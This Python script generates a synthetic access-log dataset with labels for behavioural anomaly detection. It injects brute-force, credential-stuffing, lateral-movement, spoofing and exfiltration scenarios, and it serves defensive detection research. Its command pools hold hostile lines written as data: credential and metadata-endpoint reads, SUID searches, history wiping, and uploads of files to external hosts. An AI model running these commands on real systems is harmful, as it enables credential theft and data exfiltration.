import os
import json
import random
import numpy as np
import pandas as pd
from datetime import datetime, timedelta
from faker import Faker

def generate_dataset(
    num_entities=175,
    days=30,
    min_logs=50000,
    seed=42,
    output_dir="data"
):
    """
    Generates synthetic access logs and ground truth labels for behavioral anomaly detection.
    Ensures realistic, subtle device fingerprints without string-based keyword leakage.
    """
    np.random.seed(seed)
    random.seed(seed)
    fake = Faker()
    Faker.seed(seed)

    print(f"[+] Initializing synthetic log generation (Seed: {seed})...")

    # 1. Resource Catalog
    standard_user_resources = [
        "/api/v1/user/profile", "/api/v1/dashboard", "/docs/wiki/home",
        "/hr/portal/timesheet", "/hr/portal/leave_request", "/finance/expenses/submit",
        "/communication/slack/api", "/crm/contacts/view", "/jira/board/sprint"
    ]
    sensitive_resources = [
        "/admin/domain_controller", "file:/etc/shadow", "/db/customer_pii",
        "/db/finance_export", "/cloud/s3/vault_backup", "/admin/privilege_escalate",
        "ssh:port_22_root", "/k8s/secrets/prod", "/hr/salary_archive"
    ]
    service_resources = [
        "/db/production_read", "/api/v1/metrics", "/internal/sync/jobs",
        "/cache/redis/flush", "/queue/rabbitmq/ack", "/telemetry/ingest"
    ]
    edge_resources = [
        "/iot/v2/telemetry", "/iot/v2/heartbeat", "/iot/v2/sensor_data",
        "/firmware/status_check"
    ]

    # Geolocation Pool
    geos = [
        {"city": "New York, US", "lat": 40.7128, "lon": -74.0060, "ip_prefix": "104.28.14."},
        {"city": "San Francisco, US", "lat": 37.7749, "lon": -122.4194, "ip_prefix": "192.241.18."},
        {"city": "London, UK", "lat": 51.5074, "lon": -0.1278, "ip_prefix": "81.2.140."},
        {"city": "Frankfurt, DE", "lat": 50.1109, "lon": 8.6821, "ip_prefix": "85.214.99."},
        {"city": "Tokyo, JP", "lat": 35.6762, "lon": 139.6503, "ip_prefix": "126.11.200."},
        {"city": "Singapore, SG", "lat": 1.3521, "lon": 103.8198, "ip_prefix": "118.200.45."},
        {"city": "Sydney, AU", "lat": -33.8688, "lon": 151.2093, "ip_prefix": "103.28.54."},
        {"city": "Moscow, RU", "lat": 55.7558, "lon": 37.6173, "ip_prefix": "198.51.100."},
        {"city": "Bucharest, RO", "lat": 44.4323, "lon": 26.1063, "ip_prefix": "185.220.101."}
    ]

    # Plausible Fingerprint Templates
    plausible_fingerprints = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 | {mac} | HTTPS",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) | {mac} | TLSv1.3",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 | {mac} | TLSv1.3",
        "Windows 11 Enterprise | {mac} | HTTPS",
        "macOS Sonoma 14.2 | {mac} | TLSv1.3",
        "Ubuntu 22.04 LTS Desktop | {mac} | TLSv1.2"
    ]

    # Diverse Spoof Fingerprint Pool (for generating entity-mismatched fingerprints)
    spoof_fingerprint_options = [
        ("Windows 11 Home Edition | {mac} | HTTPS", "password"),
        ("Android 14; Mobile Safari/537.36 | {mac} | TLSv1.3", "password"),
        ("Ubuntu 22.04 LTS Desktop | {mac} | TLSv1.2", "token"),
        ("FreeRTOS v10.4.3 | {mac} | MQTT/TLS", "certificate"),
        ("Linux 5.15.0-server | {mac} | mTLS", "certificate"),
        ("macOS Sonoma 14.2 | {mac} | TLSv1.3", "biometric"),
        ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) | {mac} | HTTPS", "password")
    ]

    # 2. Entity Profiles Generation
    entities = {}
    
    num_users = 100
    num_services = 45
    num_edges = 30

    for i in range(num_users):
        entity_id = f"usr_{i+1:03d}"
        geo = random.choice(geos[:3]) # NA/Europe
        mac = fake.mac_address()
        fp_template = random.choice(plausible_fingerprints[:5])
        entities[entity_id] = {
            "entity_type": "user",
            "geo": geo,
            "ip_prefix": geo["ip_prefix"],
            "auth_methods": ["password", "biometric", "token"],
            "resources": random.sample(standard_user_resources, k=random.randint(3, 6)),
            "peak_hour_mean": random.uniform(8.5, 10.0),
            "peak_hour_std": 1.5,
            "mac": mac,
            "fingerprint": fp_template.format(mac=mac)
        }

    for i in range(num_services):
        entity_id = f"svc_{i+1:03d}"
        geo = geos[0] # Datacenter
        mac = fake.mac_address()
        entities[entity_id] = {
            "entity_type": "service_account",
            "geo": geo,
            "ip_prefix": "10.0.4.",
            "auth_methods": ["token", "certificate"],
            "resources": random.sample(service_resources, k=random.randint(2, 4)),
            "peak_hour_mean": None, # 24/7
            "mac": mac,
            "fingerprint": f"Linux 5.15.0-server | {mac} | mTLS"
        }

    for i in range(num_edges):
        entity_id = f"dev_{i+1:03d}"
        geo = random.choice(geos[:4])
        mac = fake.mac_address()
        fw_ver = random.choice(["10.4.3", "10.5.1", "10.3.0"])
        entities[entity_id] = {
            "entity_type": "edge_device",
            "geo": geo,
            "ip_prefix": "172.16.100.",
            "auth_methods": ["certificate", "token"],
            "resources": random.sample(edge_resources, k=random.randint(1, 3)),
            "peak_hour_mean": None,
            "mac": mac,
            "fingerprint": f"FreeRTOS v{fw_ver} | {mac} | MQTT/TLS"
        }

    start_date = datetime(2026, 6, 1, 0, 0, 0)
    logs = []
    labels = []
    log_id_counter = 1

    print("[+] Generating normal baseline logs...")

    entity_list = list(entities.keys())

    # Generate baseline normal logs over 30 days
    for day in range(days):
        day_start = start_date + timedelta(days=day)
        
        for eid in entity_list:
            profile = entities[eid]
            etype = profile["entity_type"]

            if etype == "user":
                current_weekday = day_start.weekday()
                if current_weekday in [5, 6] and random.random() > 0.15:
                    continue # Weekend quiet for users
                
                num_sessions = random.randint(8, 16)
                for _ in range(num_sessions):
                    hour = int(np.clip(np.random.normal(profile["peak_hour_mean"], profile["peak_hour_std"]), 6, 21))
                    minute = random.randint(0, 59)
                    second = random.randint(0, 59)
                    ts = day_start.replace(hour=hour, minute=minute, second=second) + timedelta(seconds=random.randint(0, 3600))
                    
                    ip = f"{profile['ip_prefix']}{random.randint(2, 254)}"
                    res = random.choice(profile["resources"])
                    auth = random.choice(profile["auth_methods"])
                    duration = int(np.random.exponential(scale=300) + 10)
                    
                    cmds = []
                    if random.random() < 0.2:
                        cmds = random.choice([
                            ["git pull", "npm test", "docker ps"],
                            ["cd /var/www", "ls -la", "systemctl status nginx"],
                            ["python main.py", "git commit -m 'update'", "git push"]
                        ])

                    logs.append({
                        "log_id": log_id_counter,
                        "entity_id": eid,
                        "entity_type": etype,
                        "timestamp": ts.isoformat() + "Z",
                        "source_ip": ip,
                        "geo_location": profile["geo"]["city"],
                        "resource_accessed": res,
                        "auth_method": auth,
                        "session_duration": duration,
                        "command_sequence": json.dumps(cmds),
                        "device_fingerprint": profile["fingerprint"]
                    })
                    labels.append({
                        "log_id": log_id_counter,
                        "label": "normal"
                    })
                    log_id_counter += 1

            elif etype == "service_account":
                num_sessions = random.randint(18, 28)
                for s in range(num_sessions):
                    ts = day_start + timedelta(seconds=int(s * (86400 / num_sessions) + random.uniform(-300, 300)))
                    ip = f"{profile['ip_prefix']}{random.randint(10, 50)}"
                    res = random.choice(profile["resources"])
                    auth = random.choice(profile["auth_methods"])
                    duration = random.randint(1, 8)
                    cmds = []

                    logs.append({
                        "log_id": log_id_counter,
                        "entity_id": eid,
                        "entity_type": etype,
                        "timestamp": ts.isoformat() + "Z",
                        "source_ip": ip,
                        "geo_location": profile["geo"]["city"],
                        "resource_accessed": res,
                        "auth_method": auth,
                        "session_duration": duration,
                        "command_sequence": json.dumps(cmds),
                        "device_fingerprint": profile["fingerprint"]
                    })
                    labels.append({
                        "log_id": log_id_counter,
                        "label": "normal"
                    })
                    log_id_counter += 1

            elif etype == "edge_device":
                num_sessions = random.randint(24, 48)
                for s in range(num_sessions):
                    ts = day_start + timedelta(seconds=int(s * (86400 / num_sessions) + random.uniform(-60, 60)))
                    ip = f"{profile['ip_prefix']}{random.randint(1, 254)}"
                    res = random.choice(profile["resources"])
                    auth = random.choice(profile["auth_methods"])
                    duration = random.randint(1, 3)
                    cmds = []

                    logs.append({
                        "log_id": log_id_counter,
                        "entity_id": eid,
                        "entity_type": etype,
                        "timestamp": ts.isoformat() + "Z",
                        "source_ip": ip,
                        "geo_location": profile["geo"]["city"],
                        "resource_accessed": res,
                        "auth_method": auth,
                        "session_duration": duration,
                        "command_sequence": json.dumps(cmds),
                        "device_fingerprint": profile["fingerprint"]
                    })
                    labels.append({
                        "log_id": log_id_counter,
                        "label": "normal"
                    })
                    log_id_counter += 1

    print(f"[+] Baseline normal logs count: {len(logs)}")

    # 3. Inject Cyber Attack Scenarios (Subtle, varied, no keyword leakage)
    print("[+] Injecting cyber attack scenarios...")
    
    # 3.1 Brute Force Attack
    bf_targets = random.sample([e for e, p in entities.items() if p["entity_type"] == "user"], k=6)
    attacker_ips_bf = ["198.51.100.25", "198.51.100.89", "85.214.99.102", "192.241.18.90"]
    auth_endpoints_bf = ["/api/v1/auth/login", "/oauth/v2/token", "/admin/login"]

    for idx, target_user in enumerate(bf_targets):
        attacker_ip = attacker_ips_bf[idx % len(attacker_ips_bf)]
        attack_day = random.randint(2, days - 2)
        base_time = start_date + timedelta(days=attack_day, hours=random.randint(1, 23))
        login_ep = auth_endpoints_bf[idx % len(auth_endpoints_bf)]
        num_attempts = random.randint(25, 40)
        
        bf_mac = fake.mac_address()
        bf_fp = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 | {bf_mac} | HTTPS"

        for i in range(num_attempts):
            ts = base_time + timedelta(seconds=i * random.randint(4, 8))
            logs.append({
                "log_id": log_id_counter,
                "entity_id": target_user,
                "entity_type": "user",
                "timestamp": ts.isoformat() + "Z",
                "source_ip": attacker_ip,
                "geo_location": random.choice(["Moscow, RU", "Frankfurt, DE", "Bucharest, RO"]),
                "resource_accessed": login_ep,
                "auth_method": "password",
                "session_duration": random.randint(0, 2),
                "command_sequence": json.dumps([]),
                "device_fingerprint": bf_fp
            })
            labels.append({
                "log_id": log_id_counter,
                "label": "brute_force"
            })
            log_id_counter += 1

    # 3.2 Impossible Travel
    it_users = random.sample([e for e, p in entities.items() if p["entity_type"] == "user"], k=8)
    city_pairs = [
        ("New York, US", "Tokyo, JP", "126.11.200.88"),
        ("London, UK", "Singapore, SG", "118.200.45.12"),
        ("San Francisco, US", "Frankfurt, DE", "85.214.99.45"),
        ("New York, US", "Sydney, AU", "103.28.54.11"),
        ("London, UK", "Tokyo, JP", "126.11.200.99"),
        ("San Francisco, US", "Sydney, AU", "103.28.54.77"),
        ("New York, US", "Singapore, SG", "118.200.45.90"),
        ("London, UK", "Frankfurt, DE", "85.214.99.12")
    ]

    for idx, it_user in enumerate(it_users):
        profile = entities[it_user]
        attack_day = random.randint(3, days - 3)
        base_time = start_date + timedelta(days=attack_day, hours=random.randint(9, 16), minutes=random.randint(0, 40))
        home_city, dest_city, dest_ip = city_pairs[idx % len(city_pairs)]
        time_gap_mins = random.randint(3, 14)
        
        # Normal login at home
        logs.append({
            "log_id": log_id_counter,
            "entity_id": it_user,
            "entity_type": "user",
            "timestamp": base_time.isoformat() + "Z",
            "source_ip": f"{profile['ip_prefix']}45",
            "geo_location": home_city,
            "resource_accessed": profile["resources"][0],
            "auth_method": profile["auth_methods"][0],
            "session_duration": random.randint(120, 300),
            "command_sequence": json.dumps([]),
            "device_fingerprint": profile["fingerprint"]
        })
        labels.append({
            "log_id": log_id_counter,
            "label": "normal"
        })
        log_id_counter += 1

        # Impossible travel login shortly after
        ts_anom = base_time + timedelta(minutes=time_gap_mins)
        dest_mac = fake.mac_address()
        dest_fp = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) | {dest_mac} | TLSv1.3"
        logs.append({
            "log_id": log_id_counter,
            "entity_id": it_user,
            "entity_type": "user",
            "timestamp": ts_anom.isoformat() + "Z",
            "source_ip": dest_ip,
            "geo_location": dest_city,
            "resource_accessed": random.choice(profile["resources"]),
            "auth_method": "password",
            "session_duration": random.randint(30, 90),
            "command_sequence": json.dumps([]),
            "device_fingerprint": dest_fp
        })
        labels.append({
            "log_id": log_id_counter,
            "label": "impossible_travel"
        })
        log_id_counter += 1

    # 3.3 Credential Stuffing Attack
    attacker_ips_cs = ["185.220.101.5", "194.26.29.110", "45.154.255.87"]
    cs_attacker_ip = random.choice(attacker_ips_cs)
    attack_day = random.randint(5, days - 5)
    cs_time = start_date + timedelta(days=attack_day, hours=random.randint(1, 5), minutes=15)
    cs_targets = random.sample(list(entities.keys()), k=40)
    cs_mac = fake.mac_address()
    cs_fp = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) | {cs_mac} | HTTPS"
    
    for idx, target in enumerate(cs_targets):
        ts = cs_time + timedelta(seconds=idx * random.randint(3, 6))
        logs.append({
            "log_id": log_id_counter,
            "entity_id": target,
            "entity_type": entities[target]["entity_type"],
            "timestamp": ts.isoformat() + "Z",
            "source_ip": cs_attacker_ip,
            "geo_location": "Bucharest, RO",
            "resource_accessed": random.choice(["/api/v1/auth/login", "/oauth/v2/token"]),
            "auth_method": "password",
            "session_duration": 1,
            "command_sequence": json.dumps([]),
            "device_fingerprint": cs_fp
        })
        labels.append({
            "log_id": log_id_counter,
            "label": "credential_stuffing"
        })
        log_id_counter += 1

    # 3.4 Lateral Movement
    lm_users = random.sample([e for e, p in entities.items() if p["entity_type"] == "user"], k=6)
    cmd_sequence_pool = [
        ["whoami", "id", "cat /etc/passwd"],
        ["sudo -l", "find / -perm -4000 2>/dev/null", "crontab -l"],
        ["nmap -sS -p 22,80,443 10.0.0.0/24", "netstat -tulpn"],
        ["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/", "env"],
        ["ps aux | grep root", "cat ~/.bash_history", "history -c"]
    ]

    for idx, lm_user in enumerate(lm_users):
        attack_day = random.randint(7, days - 2)
        lm_time = start_date + timedelta(days=attack_day, hours=random.randint(20, 23), minutes=20)
        profile = entities[lm_user]

        for i in range(10):
            ts = lm_time + timedelta(minutes=i * random.randint(4, 7))
            cmds = cmd_sequence_pool[(idx + i) % len(cmd_sequence_pool)]
            logs.append({
                "log_id": log_id_counter,
                "entity_id": lm_user,
                "entity_type": "user",
                "timestamp": ts.isoformat() + "Z",
                "source_ip": f"10.0.99.{random.randint(10, 80)}",
                "geo_location": profile["geo"]["city"],
                "resource_accessed": sensitive_resources[(idx + i) % len(sensitive_resources)],
                "auth_method": "token",
                "session_duration": random.randint(120, 600),
                "command_sequence": json.dumps(cmds),
                "device_fingerprint": profile["fingerprint"]
            })
            labels.append({
                "log_id": log_id_counter,
                "label": "lateral_movement"
            })
            log_id_counter += 1

    # 3.5 Device Spoofing (Fixed: Diverse impersonation per entity)
    # Selected entities show up with fingerprints clearly mismatched against their own baseline profile
    # (e.g. Edge device FreeRTOS -> Windows/macOS; User macOS -> Windows/Android/Linux Server)
    spoofed_user_targets = random.sample([e for e, p in entities.items() if p["entity_type"] == "user"], k=5)
    spoofed_svc_targets = random.sample([e for e, p in entities.items() if p["entity_type"] == "service_account"], k=2)
    spoofed_dev_targets = random.sample([e for e, p in entities.items() if p["entity_type"] == "edge_device"], k=3)
    all_spoof_targets = spoofed_user_targets + spoofed_svc_targets + spoofed_dev_targets

    for idx, sentity in enumerate(all_spoof_targets):
        profile = entities[sentity]
        attack_day = random.randint(4, days - 4)
        spoof_time = start_date + timedelta(days=attack_day, hours=random.randint(8, 17), minutes=10)
        
        # Pick a spoof template that is GUARANTEED distinct from this entity's baseline OS
        baseline_fp = profile["fingerprint"]
        valid_spoofs = []
        for template_str, auth_option in spoof_fingerprint_options:
            os_key = template_str.split(" | ")[0].split(";")[0].split(" ")[0]
            if os_key not in baseline_fp:
                valid_spoofs.append((template_str, auth_option))
        
        # Randomly choose one from all valid spoof options for maximum variation
        spoof_tmpl, spoof_auth = random.choice(valid_spoofs)
        spoof_mac = fake.mac_address()
        spoofed_fp = spoof_tmpl.format(mac=spoof_mac)

        for i in range(5):
            ts = spoof_time + timedelta(minutes=i * random.randint(8, 15))
            logs.append({
                "log_id": log_id_counter,
                "entity_id": sentity,
                "entity_type": profile["entity_type"],
                "timestamp": ts.isoformat() + "Z",
                "source_ip": f"198.51.100.{random.randint(50, 150)}",
                "geo_location": profile["geo"]["city"],
                "resource_accessed": random.choice(profile["resources"]),
                "auth_method": spoof_auth,
                "session_duration": random.randint(20, 90),
                "command_sequence": json.dumps([]),
                "device_fingerprint": spoofed_fp
            })
            labels.append({
                "log_id": log_id_counter,
                "label": "device_spoofing"
            })
            log_id_counter += 1

    # 3.6 Low and Slow Exfiltration
    exfil_users = random.sample([e for e, p in entities.items() if p["entity_type"] == "user"], k=4)
    exfil_endpoints = ["/db/finance_export", "/cloud/s3/vault_backup", "/db/customer_pii", "/hr/salary_archive"]
    exfil_cmds = [
        ["aws s3 cp /tmp/export.csv s3://external-vault/"],
        ["curl -F file=@data_chunk.tar.gz https://transfer.sh/upload"],
        ["scp -P 2222 /tmp/backup.db backup@ext-server.net:/data/"],
        ["rsync -avz /var/log/exports/ ext-node:/backup/"]
    ]

    for idx, exuser in enumerate(exfil_users):
        profile = entities[exuser]
        start_exfil_day = random.randint(5, 15)
        target_res = exfil_endpoints[idx % len(exfil_endpoints)]
        target_cmd = exfil_cmds[idx % len(exfil_cmds)]
        
        for d in range(10):
            exfil_time = start_date + timedelta(days=start_exfil_day + d, hours=random.randint(1, 4), minutes=random.randint(10, 50))
            logs.append({
                "log_id": log_id_counter,
                "entity_id": exuser,
                "entity_type": "user",
                "timestamp": exfil_time.isoformat() + "Z",
                "source_ip": f"{profile['ip_prefix']}{random.randint(100, 200)}",
                "geo_location": profile["geo"]["city"],
                "resource_accessed": target_res,
                "auth_method": "token",
                "session_duration": random.randint(900, 1800),
                "command_sequence": json.dumps(target_cmd),
                "device_fingerprint": profile["fingerprint"]
            })
            labels.append({
                "log_id": log_id_counter,
                "label": "low_slow_exfiltration"
            })
            log_id_counter += 1

    # 3.7 Insider Drift (Ambiguous FP tuning scenario)
    drift_users = random.sample([e for e, p in entities.items() if p["entity_type"] == "user"], k=5)
    drift_resources = [
        "/jira/board/sprint_security_refactor",
        "/docs/architecture_v2",
        "/dev/repo_new_service",
        "/analytics/bi_dashboard"
    ]
    drift_cmds = [
        ["git checkout security-dev", "mvn clean install"],
        ["docker build -t microservice:v2 .", "docker run -p 8080:8080 microservice:v2"],
        ["npm run build", "npm test"],
        ["python setup.py build", "pytest tests/"]
    ]

    for idx, duser in enumerate(drift_users):
        profile = entities[duser]
        new_res = drift_resources[idx % len(drift_resources)]
        new_cmd = drift_cmds[idx % len(drift_cmds)]
        
        for d in range(15, days):
            drift_time = start_date + timedelta(days=d, hours=random.randint(13, 17), minutes=random.randint(0, 59))
            logs.append({
                "log_id": log_id_counter,
                "entity_id": duser,
                "entity_type": "user",
                "timestamp": drift_time.isoformat() + "Z",
                "source_ip": f"{profile['ip_prefix']}{random.randint(2, 254)}",
                "geo_location": profile["geo"]["city"],
                "resource_accessed": new_res,
                "auth_method": profile["auth_methods"][0],
                "session_duration": random.randint(300, 600),
                "command_sequence": json.dumps(new_cmd),
                "device_fingerprint": profile["fingerprint"]
            })
            labels.append({
                "log_id": log_id_counter,
                "label": "insider_drift"
            })
            log_id_counter += 1

    # 4. Construct DataFrames and sort by timestamp
    df_logs = pd.DataFrame(logs)
    df_labels = pd.DataFrame(labels)

    # Sort chronologically
    df_logs["dt"] = pd.to_datetime(df_logs["timestamp"])
    df_logs = df_logs.sort_values("dt").reset_index(drop=True)
    df_logs = df_logs.drop(columns=["dt"])

    # Maintain matching label ordering via log_id index
    df_labels = df_labels.set_index("log_id").loc[df_logs["log_id"]].reset_index()

    # Create output directory if not exists
    os.makedirs(output_dir, exist_ok=True)

    logs_path = os.path.join(output_dir, "access_logs.csv")
    labels_path = os.path.join(output_dir, "ground_truth_labels.csv")

    df_logs.to_csv(logs_path, index=False)
    df_labels.to_csv(labels_path, index=False)

    print(f"\n[+] Successfully generated synthetic logs dataset:")
    print(f"    - Access Logs: {logs_path} ({len(df_logs):,} rows)")
    print(f"    - Ground Truth Labels: {labels_path} ({len(df_labels):,} rows)")

    return df_logs, df_labels

if __name__ == "__main__":
    generate_dataset()
